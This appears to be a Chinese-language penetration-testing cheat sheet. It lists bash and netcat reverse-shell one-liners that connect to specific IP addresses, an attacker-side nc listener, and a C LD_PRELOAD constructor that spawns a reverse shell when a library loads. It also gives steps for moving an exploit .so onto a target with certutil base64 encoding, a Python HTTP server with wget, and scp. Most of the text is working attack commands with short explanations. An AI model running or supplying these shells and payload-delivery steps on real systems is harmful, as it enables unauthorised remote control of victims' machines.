## bash 反弹

```
攻击者：nc -lvp 12345

python3 -m http.server 12345
启动http服务

受害者：
bash -i >& /dev/tcp/8.130.20.254/12345 0>&1
bash -i >& /dev/tcp/192.168.1.129/8888 0>&1
nc -e /bin/sh 8.130.20.254 12345
bash -c 'exec bash -i &>/dev/tcp/192.168.1.9/8888 <&1'


nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口
-l 监听模式，用于入站连接
-v 详细输出--用两个-v可得到更详细的内容
-p port 本地端口号

bash -i代表在本地打开一个bash
>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps
/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接
远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出
```

[反弹shell汇总，看我一篇就够了_getshell和反弹shell_lainwith的博客-CSDN博客](https://blog.csdn.net/weixin_44288604/article/details/111740527)



```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i >& /dev/tcp/50.x.x.25/1234 0>&1'");
}
```



## 传文件

#### 编码写入

https://www.freebuf.com/articles/system/178515.html

https://github.com/Zzzxbug/NcPutter

在windows上用自带的工具certutil将所需要的文件base64加密

```
certutil -encode originalFile targetFile

certutil -encode exp.so exp_v.txt
```

打开txt文件后，将最后一行和第一行删除，并将所有的`\r\n`给删除掉

#### wget和curl

在vps上启动http服务

```
python3 -m http.server 12345
```

使用wget获取即可





```
从本地上传到远程
scp /home/xx root@10.10.10.10:/home/xx

然后输入对方相应帐号的登录密码即可

从远程上传到本地：
scp root@10.10.10.10:/home/xx /home/xx
```

